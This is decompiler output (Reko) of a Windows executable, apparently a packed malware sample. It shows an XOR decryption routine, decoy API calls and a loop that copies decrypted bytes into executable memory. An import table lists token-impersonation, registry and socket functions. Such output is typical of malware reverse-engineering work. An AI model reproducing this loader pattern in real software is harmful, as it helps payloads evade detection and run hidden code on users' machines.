// subject_CODE.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 13101000: void fn13101000(Stack Eq_2 dwArg04, Stack Eq_3 dwArg08, Stack Eq_4 dwArg0C, Stack Eq_4 dwArg10, Stack Eq_4 dwArg14, Stack Eq_4 dwArg18)
// Called from:
//      Win32CrtStartup
void fn13101000(Eq_2 dwArg04, Eq_3 dwArg08, Eq_4 dwArg0C, Eq_4 dwArg10, Eq_4 dwArg14, Eq_4 dwArg18)
{
	*dwArg10.u4 = (uint32) dwArg0C;
	word16 wLoc08_103 = (word16) ((uint64) dwArg14 % 0x05);
	word32 dwArg08_108 = dwArg08 + dwArg14;
	while (true)
	{
		--dwArg0C;
		if (dwArg0C == 0x00)
			break;
		*dwArg04.u0 = *dwArg08_108 ^ (dwArg18.u2)[(int32) wLoc08_103];
		++wLoc08_103;
		if ((int32) wLoc08_103 == 0x05)
			wLoc08_103 = 0x00;
		dwArg04.u0 = (word32) dwArg04 + 1;
		++dwArg08_108;
	}
}

// 1310109B: Register Eq_4 Win32CrtStartup()
Eq_4 Win32CrtStartup()
{
	ptr32 fp;
	Eq_44 tLoc10;
	AddAccessDeniedAce((ACL *) 0x02800000, 0x04A00000, 0x2600, null);
	Eq_56 eax_27 = SafeArrayGetUBound(null, 0x028C0000, (LONG *) 0x0900);
	ADVAPI32.dll!BuildExplicitAccessWithNameA(fp + 4, 0x00010000, 0x02800000, 0x00E00000, 0x00, 0x04A00000, 0x00, 0x028C0000, 0x2600, 0x0800, 0x0900, 0x00, eax_27, 181);
	KERNEL32.dll!BaseInitAppcompatCacheSupport(0x18);
	word32 eax_62 = eax_27->dw930A1FA9;
	esp_48->tFFFFFFFC.u1 = (DWORD) (fp - 0x0234);
	esp_48->tFFFFFFF8.u1 = (DWORD) 0x00;
	esp_48->tFFFFFFF4.u1 = (DWORD) &tLoc10;
	esp_48->tFFFFFFF0.u1 = (DWORD) 0x04;
	esp_48->tFFFFFFEC.u0 = (ptr32) (fp - 0x023C);
	esp_48->tFFFFFFE8.u0 = (byte *) (fp - 0x023C);
	fn13101000(esp_48->tFFFFFFE8.u0, esp_48->tFFFFFFEC.u0, esp_48->tFFFFFFF0.u1, esp_48->tFFFFFFF4.u1, esp_48->tFFFFFFF8.u1, esp_48->tFFFFFFFC.u1);
	SetErrorMode(esp_48->tFFFFFFFC.u1);
	KERNEL32.dll!BaseInitAppcompatCacheSupport(0x1C, fp, fp - 4, 0x0BC0);
	Eq_154 ecx_108 = eax_27->t930A1FAD.dw0000;
	esp_101->tFFFFFFFC.u1 = (DWORD) (fp - 0x0234);
	esp_101->tFFFFFFF8.u1 = (DWORD) 0x04;
	esp_101->tFFFFFFF4.u1 = (DWORD) &tLoc10;
	esp_101->tFFFFFFF0.u1 = (DWORD) 0x04;
	esp_101->tFFFFFFEC.u0 = (ptr32) (fp - 0x025C);
	esp_101->tFFFFFFE8.u0 = (byte *) (fp - 600);
	fn13101000(esp_101->tFFFFFFE8.u0, esp_101->tFFFFFFEC.u0, esp_101->tFFFFFFF0.u1, esp_101->tFFFFFFF4.u1, esp_101->tFFFFFFF8.u1, esp_101->tFFFFFFFC.u1);
	Eq_206 ecx_142 = eax_27->t930A1FB1.dw0000;
	KERNEL32.dll!BaseDumpAppcompatCache(ecx_142);
	esp_144->tFFFFFFFC.u1 = (DWORD) (fp - 0x0234);
	esp_144->tFFFFFFF8.u1 = (DWORD) 0x08;
	esp_144->tFFFFFFF4.u1 = (DWORD) &tLoc10;
	esp_144->tFFFFFFF0.u1 = (DWORD) 0x04;
	esp_144->tFFFFFFEC.u0 = (ptr32) (fp - 0x1C);
	esp_144->tFFFFFFE8.u0 = (byte *) (fp - 20);
	fn13101000(esp_144->tFFFFFFE8.u0, esp_144->tFFFFFFEC.u0, esp_144->tFFFFFFF0.u1, esp_144->tFFFFFFF4.u1, esp_144->tFFFFFFF8.u1, esp_144->tFFFFFFFC.u1);
	Eq_261 eax_185 = GetModuleHandleA(esp_144->tFFFFFFFC.u1);
	esp_144->tFFFFFFFC.u1 = (DWORD) 0x00;
	AdjustTokenGroups(esp_144->tFFFFFFE8, esp_144->tFFFFFFEC.u1, esp_144->tFFFFFFF0.u1, esp_144->tFFFFFFF4.u1, esp_144->tFFFFFFF8.u1, esp_144->tFFFFFFFC.u1);
	esp_144->tFFFFFFFC.u1 = (DWORD) 0x0188;
	esp_144->tFFFFFFF8.u1 = (DWORD) 0x00;
	esp_144->tFFFFFFF4.u1 = (DWORD) 0x0B200000;
	esp_144->tFFFFFFF0.u1 = (DWORD) 0x0110;
	esp_144->tFFFFFFEC.u0 = 0x90000000;
	ADVAPI32.dll!ControlTraceA(0x0C, (word32) eax_185.t0000 + 0x00001000, &eax_27->t930A1FB5.t0000.u0, eax_185, 0x00, 0x00, 0x4400, 0x80000000, 0x78000000, 0x00);
	ADVAPI32.dll!BuildTrusteeWithObjectsAndNameA(fp + 4, fp + 4, 0x0009C000, 0x00, 0x0C000000, 0x10C0);
	Eq_344 ebx_243 = eax_27->t930A1FB5.t0000.u0;
	esp_236->tFFFFFFFC.u1 = (DWORD) (fp - 0x0234);
	esp_236->tFFFFFFF8.u1 = (DWORD) 0x0C;
	esp_236->tFFFFFFF4.u1 = (DWORD) &tLoc10;
	esp_236->tFFFFFFF0.u1 = (DWORD) 0x04;
	esp_236->tFFFFFFEC.u0 = (ptr32) (fp - 0x28);
	esp_236->tFFFFFFE8.u0 = (byte *) (fp - 28);
	fn13101000(esp_236->tFFFFFFE8.u0, esp_236->tFFFFFFEC.u0, esp_236->tFFFFFFF0.u1, esp_236->tFFFFFFF4.u1, esp_236->tFFFFFFF8.u1, esp_236->tFFFFFFFC.u1);
	Eq_395 dwLoc2388_588 = eax_27->t930A1FB9.t0000.u0;
	esp_236->tFFFFFFFC.u1 = (DWORD) (fp - 0x0234);
	esp_236->tFFFFFFF8.u1 = (DWORD) 0x10;
	esp_236->tFFFFFFF4.u1 = (DWORD) &tLoc10;
	esp_236->tFFFFFFF0.u1 = (DWORD) 0x04;
	esp_236->tFFFFFFEC.u0 = (ptr32) (fp + ~0x2397);
	esp_236->tFFFFFFE8.u0 = (byte *) (fp + ~0x2387);
	fn13101000(esp_236->tFFFFFFE8.u0, esp_236->tFFFFFFEC.u0, esp_236->tFFFFFFF0.u1, esp_236->tFFFFFFF4.u1, esp_236->tFFFFFFF8.u1, esp_236->tFFFFFFFC.u1);
	esp_236->tFFFFFFFC.u1 = (DWORD) 0x40;
	esp_236->tFFFFFFF8.u1 = (DWORD) 0x3000;
	Eq_395 ebx_326 = ecx_142 *32 0x08 + 0x0C;
	Mem336[esp_236 + -0x0C:word32] = ebx_326 + ecx_108 + eax_62;
	esp_236->tFFFFFFF0.u1 = (DWORD) 0x00;
	Eq_4 dwLoc2390_589 = 0x14;
	Eq_470 dwLoc24_590 = (char *) &eax_27->t930A1FB9.t0000 + 4;
	Eq_4 eax_339 = VirtualAlloc(esp_236->tFFFFFFF0.u1, esp_236->tFFFFFFF4.u1, esp_236->tFFFFFFF8.u1, esp_236->tFFFFFFFC.u1);
	word32 dwLoc0C_593 = ebx_243 + eax_185 + ebx_326;
	Eq_395 dwLoc0264_595 = ebx_326;
	Eq_206 dwLoc08_596 = 0x00;
	Eq_499 dwLoc18_597 = 0x00;
	while (true)
	{
		if (dwLoc0264_595 == dwLoc2388_588)
		{
			dwLoc08_596 = (Eq_206) ((word32) dwLoc08_596.dw0000 + 1);
			if (dwLoc08_596 == ecx_142)
				;
			Eq_395 ecx_369 = dwLoc24_590->t0000.t0000.t0000.u0;
			esp_236->tFFFFFFFC.u1 = (DWORD) (fp - 0x0234);
			esp_236->tFFFFFFF8.u1 = (DWORD) dwLoc2390_589;
			esp_236->tFFFFFFF4.u1 = (DWORD) &tLoc10;
			esp_236->tFFFFFFF0.u1 = (DWORD) 0x04;
			esp_236->tFFFFFFEC.u0 = (ptr32) (fp - 28 - dwLoc2390_589);
			esp_236->tFFFFFFE8.u0 = (byte *) (fp - 28);
			fn13101000(esp_236->tFFFFFFE8.u0, esp_236->tFFFFFFEC.u0, esp_236->tFFFFFFF0.u1, esp_236->tFFFFFFF4.u1, esp_236->tFFFFFFF8.u1, esp_236->tFFFFFFFC.u1);
			Eq_567 dwLoc24_609 = dwLoc24_590 + 1;
			dwLoc2388_588 = (Eq_395) dwLoc24_609->t0000.t0000.t0000.u0;
			esp_236->tFFFFFFFC.u1 = (DWORD) (fp - 0x0234);
			Eq_4 dwLoc2390_608 = &dwLoc2390_589.u5->Groups->Sid;
			esp_236->tFFFFFFF8.u1 = (DWORD) dwLoc2390_608;
			esp_236->tFFFFFFF4.u1 = (DWORD) &tLoc10;
			esp_236->tFFFFFFF0.u1 = (DWORD) 0x04;
			esp_236->tFFFFFFEC.u0 = (ptr32) (fp + ~0x2387 - dwLoc2390_608);
			esp_236->tFFFFFFE8.u0 = (byte *) (fp + ~0x2387);
			fn13101000(esp_236->tFFFFFFE8.u0, esp_236->tFFFFFFEC.u0, esp_236->tFFFFFFF0.u1, esp_236->tFFFFFFF4.u1, esp_236->tFFFFFFF8.u1, esp_236->tFFFFFFFC.u1);
			dwLoc2390_589.u2 = &dwLoc2390_608.u5->Groups->Sid;
			dwLoc24_590 = (Eq_470) (dwLoc24_609 + 1);
			dwLoc0264_595 = (Eq_395) 0x00;
			dwLoc0C_593 = ecx_369 + eax_185;
		}
		Mem462[eax_339 + dwLoc18_597:byte] = Mem457[dwLoc0C_593 + 0x00:byte];
		++dwLoc0C_593;
		++dwLoc18_597;
		++dwLoc0264_595;
	}
}

// subject_idata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

word32 g_dw131100A0 = 0x00010350; // 131100A0
word32 g_dw131100A4 = 66398; // 131100A4
word32 g_dw131100A8 = 66412; // 131100A8
word32 g_dw131100AC = 66422; // 131100AC
word32 g_dw131100B4 = 66442; // 131100B4
word32 g_dw131100B8 = 66466; // 131100B8
word32 g_dw131100BC = 66488; // 131100BC
word32 g_dw131100C4 = 0x000103D0; // 131100C4
word32 g_dw131100C8 = 66530; // 131100C8
word32 g_dw131100CC = 66548; // 131100CC
word32 g_dw131100D0 = 0x0001040A; // 131100D0
word32 g_dw131100D4 = 0x00010416; // 131100D4
word32 g_dw131100D8 = 66598; // 131100D8
word32 g_dw131100DC = 66606; // 131100DC
word32 g_dw131100E0 = 66618; // 131100E0
word32 g_dw131100E4 = 66638; // 131100E4
word32 g_dw131100E8 = 66654; // 131100E8
word32 g_dw131100EC = 66668; // 131100EC
word32 g_dw131100F0 = 66688; // 131100F0
word32 g_dw131100F4 = 66702; // 131100F4
word32 g_dw131100FC = 66728; // 131100FC
word32 g_dw13110100 = 66744; // 13110100
word32 g_dw13110104 = 66766; // 13110104
word32 g_dw13110108 = 66788; // 13110108
word32 g_dw1311010C = 66808; // 1311010C
word32 g_dw13110110 = 0x00010508; // 13110110
word32 g_dw13110114 = 66848; // 13110114
word32 g_dw13110118 = 66866; // 13110118
word32 g_dw1311011C = 66888; // 1311011C
word32 g_dw13110120 = 0x0001055E; // 13110120
word32 g_dw13110124 = 66924; // 13110124
word32 g_dw13110128 = 66942; // 13110128
word32 g_dw1311012C = 66962; // 1311012C
word32 g_dw13110130 = 66980; // 13110130
word32 g_dw13110138 = 0x000105C6; // 13110138
word32 g_dw1311013C = 67026; // 1311013C
word32 g_dw13110140 = 67036; // 13110140
word32 g_dw13110144 = 67046; // 13110144
word32 g_dw13110148 = 0x000105F0; // 13110148
word32 g_dw1311014C = 67064; // 1311014C
word32 g_dw13110150 = 0x00010602; // 13110150
word32 g_dw13110154 = 0x0001060C; // 13110154
word32 g_dw13110158 = 0x00010616; // 13110158
word32 g_dw13110160 = 67114; // 13110160
word32 g_dw13110164 = 0x00010644; // 13110164
word32 g_dw13110168 = 0x00010656; // 13110168
word32 g_dw1311016C = 0x00010678; // 1311016C
word32 g_dw13110170 = 0x00010690; // 13110170
word32 g_dw13110174 = 0x000106A6; // 13110174
word32 g_dw13110178 = 67262; // 13110178
word32 g_dw1311017C = 67282; // 1311017C
word32 g_dw13110180 = 0x000106E6; // 13110180
word32 g_dw13110184 = 0x000106F8; // 13110184
word32 g_dw13110188 = 0x00010718; // 13110188
word32 g_dw1311018C = 67368; // 1311018C
word32 g_dw13110190 = 67388; // 13110190
word32 g_dw13110194 = 67404; // 13110194
word32 g_dw13110198 = 67422; // 13110198
word32 g_dw1311019C = 67436; // 1311019C
word32 g_dw131101A0 = 0x0001077E; // 131101A0
word32 g_dw131101A4 = 0x00010790; // 131101A4
word32 g_dw131101A8 = 0x000107A0; // 131101A8
word32 g_dw131101AC = 0x000107B4; // 131101AC
word32 g_dw131101B0 = 0x000107C4; // 131101B0
word32 g_dw131101B4 = 67544; // 131101B4
word32 g_dw131101B8 = 67566; // 131101B8
word32 g_dw131101BC = 0x00010800; // 131101BC
word32 g_dw131101C4 = 0x00010822; // 131101C4
word32 g_dw131101C8 = 67638; // 131101C8
word32 g_dw131101CC = 67660; // 131101CC
word32 g_dw131101D0 = 67676; // 131101D0
word32 g_dw131101D4 = 67702; // 131101D4
word32 g_dw131101D8 = 0x00010886; // 131101D8
word32 g_dw131101DC = 67736; // 131101DC
word32 g_dw131101E0 = 67746; // 131101E0
word32 g_dw131101E4 = 67760; // 131101E4
word32 g_dw131101E8 = 67776; // 131101E8
word32 g_dw131101EC = 0x000108D0; // 131101EC
word32 g_dw131101F0 = 0x000108F0; // 131101F0
<anonymous> * __imp__WSACleanup = &g_t10350; // 131101F8
<anonymous> * __imp__WSAStartup = &g_t1035E; // 131101FC
<anonymous> * __imp__listen = &g_t1036C; // 13110200
<anonymous> * __imp__bind = &g_t10376; // 13110204
<anonymous> * __imp__PropVariantChangeType = &g_t1038A; // 1311020C
<anonymous> * __imp__CLIPFORMAT_UserFree = &g_t103A2; // 13110210
<anonymous> * __imp__BindMoniker = &g_t103B8; // 13110214
<anonymous> * __imp__DefWindowProcW = &g_t103D0; // 1311021C
<anonymous> * __imp__CreateWindowExW = &g_t103E2; // 13110220
<anonymous> * __imp__SetForegroundWindow = &g_t103F4; // 13110224
<anonymous> * __imp__ReleaseDC = &g_t1040A; // 13110228
<anonymous> * __imp__GetClientRect = &g_t10416; // 1311022C
<anonymous> * __imp__GetDC = &g_t10426; // 13110230
<anonymous> * __imp__EndDialog = &g_t1042E; // 13110234
<anonymous> * __imp__GetSystemMetrics = &g_t1043A; // 13110238
<anonymous> * __imp__GetWindowRect = &g_t1044E; // 1311023C
<anonymous> * __imp__LoadStringW = &g_t1045E; // 13110240
<anonymous> * __imp__TranslateMessage = &g_t1046C; // 13110244
<anonymous> * __imp__ShowWindow = &g_t10480; // 13110248
<anonymous> * __imp__GetDlgItem = &g_t1048E; // 1311024C
<anonymous> * __imp__SysFreeString = &g_t104A8; // 13110254
<anonymous> * __imp__SafeArrayAccessData = &g_t104B8; // 13110258
<anonymous> * __imp__SafeArrayGetElement = &g_t104CE; // 1311025C
<anonymous> * __imp__VariantChangeType = &g_t104E4; // 13110260
<anonymous> * __imp__VariantClear = &g_t104F8; // 13110264
<anonymous> * __imp__SysAllocStringByteLen = &g_t10508; // 13110268
<anonymous> * __imp__GetActiveObject = &g_t10520; // 1311026C
<anonymous> * __imp__SysReAllocStringLen = &g_t10532; // 13110270
<anonymous> * __imp__SafeArrayGetUBound = &g_t10548; // 13110274
<anonymous> * __imp__VariantCopy = &g_t1055E; // 13110278
<anonymous> * __imp__SafeArrayCreate = &g_t1056C; // 1311027C
<anonymous> * __imp__SysAllocStringLen = &g_t1057E; // 13110280
<anonymous> * __imp__VariantCopyInd = &g_t10592; // 13110284
<anonymous> * __imp__SysStringByteLen = &g_t105A4; // 13110288
<anonymous> * __imp___atoldbl = &g_t105C6; // 13110290
<anonymous> * __imp___c_exit = &g_t105D2; // 13110294
<anonymous> * __imp___access = &g_t105DC; // 13110298
<anonymous> * __imp___cgets = &g_t105E6; // 1311029C
<anonymous> * __imp___beep = &g_t105F0; // 131102A0
<anonymous> * __imp___chdir = &g_t105F8; // 131102A4
<anonymous> * __imp___assert = &g_t10602; // 131102A8
<anonymous> * __imp___atoi64 = &g_t1060C; // 131102AC
<anonymous> * __imp___cabs = &g_t10616; // 131102B0
<anonymous> * __imp__ImpersonateLoggedOnUser = &g_t1062A; // 131102B8
<anonymous> * __imp__CryptCreateHash = &g_t10644; // 131102BC
<anonymous> * __imp__BuildTrusteeWithObjectsAndNameA = &g_t10656; // 131102C0
<anonymous> * __imp__CheckTokenMembership = &g_t10678; // 131102C4
<anonymous> * __imp__CloseServiceHandle = &g_t10690; // 131102C8
<anonymous> * __imp__CryptAcquireContextW = &g_t106A6; // 131102CC
<anonymous> * __imp__DuplicateTokenEx = &g_t106BE; // 131102D0
<anonymous> * __imp__RegQueryInfoKeyA = &g_t106D2; // 131102D4
<anonymous> * __imp__RegCreateKeyExA = &g_t106E6; // 131102D8
<anonymous> * __imp__BuildExplicitAccessWithNameA = &g_t106F8; // 131102DC
<anonymous> * __imp__RegOpenKeyExA = &g_t10718; // 131102E0
<anonymous> * __imp__AdjustTokenGroups = &g_t10728; // 131102E4
<anonymous> * __imp__ControlTraceA = &g_t1073C; // 131102E8
<anonymous> * __imp__RegSetValueExW = &g_t1074C; // 131102EC
<anonymous> * __imp__RegCloseKey = &g_t1075E; // 131102F0
<anonymous> * __imp__RegDeleteValueW = &g_t1076C; // 131102F4
<anonymous> * __imp__RegCreateKeyExW = &g_t1077E; // 131102F8
<anonymous> * __imp__RegDeleteKeyW = &g_t10790; // 131102FC
<anonymous> * __imp__OpenProcessToken = &g_t107A0; // 13110300
<anonymous> * __imp__RegOpenKeyExW = &g_t107B4; // 13110304
<anonymous> * __imp__RegQueryValueExW = &g_t107C4; // 13110308
<anonymous> * __imp__AddAccessDeniedAce = &g_t107D8; // 1311030C
<anonymous> * __imp__RegSetValueExA = &g_t107EE; // 13110310
<anonymous> * __imp__RegQueryValueExA = &g_t10800; // 13110314
<anonymous> * __imp__GetModuleHandleA = &g_t10822; // 1311031C
<anonymous> * __imp__EnumResourceNamesA = &g_t10836; // 13110320
<anonymous> * __imp__LockResource = &g_t1084C; // 13110324
<anonymous> * __imp__BaseDumpAppcompatCache = &g_t1085C; // 13110328
<anonymous> * __imp__SetErrorMode = &g_t10876; // 1311032C
<anonymous> * __imp__GetStartupInfoA = &g_t10886; // 13110330
<anonymous> * __imp__GetACP = &g_t10898; // 13110334
<anonymous> * __imp__ExitProcess = &g_t108A2; // 13110338
<anonymous> * __imp__VirtualAlloc = &g_t108B0; // 1311033C
<anonymous> * __imp__FindResourceA = &g_t108C0; // 13110340
<anonymous> * __imp__BaseInitAppcompatCacheSupport = &g_t108D0; // 13110344
<anonymous> * __imp__EnumResourceTypesA = &g_t108F0; // 13110348
